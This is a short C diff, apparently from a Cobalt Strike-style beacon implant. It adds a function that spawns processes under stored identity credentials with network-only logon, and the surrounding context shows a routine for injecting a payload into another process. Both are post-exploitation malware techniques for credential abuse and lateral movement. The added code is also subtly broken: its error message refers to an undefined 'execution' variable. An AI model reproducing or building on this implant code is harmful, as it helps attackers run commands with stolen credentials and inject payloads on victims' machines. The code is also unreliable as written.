@@ -1003,6 +1003,30 @@ BOOL ProcessCmdAdjust(PROCESS_INFORMATION* processInfo, EXPANDED_CMD* cmds) {
 		return FALSE;
 }
 
+BOOL SpawnProcessWithLogon(RUN_UNDER_CONFIG* runUnderConfig, WCHAR* cmd, const WCHAR* currentDirectory)
+{
+	if (!CreateProcessWithLogonW(
+		gIdentityUsername,
+		gIdentityDomain,
+		gIdentityPassword,
+		LOGON_NETCREDENTIALS_ONLY,
+		NULL,
+		cmd,
+		runUnderConfig->creationFlags,
+		NULL,
+		currentDirectory,
+		runUnderConfig->startupInfo,
+		runUnderConfig->processInfo))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not spawn %s (token&creds): %s", execution->cmd, LAST_ERROR_STR(lastError));
+		BeaconErrorDS(ERROR_SPAWN_TOKEN_AND_CREDS, lastError, runUnderConfig->cmd);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
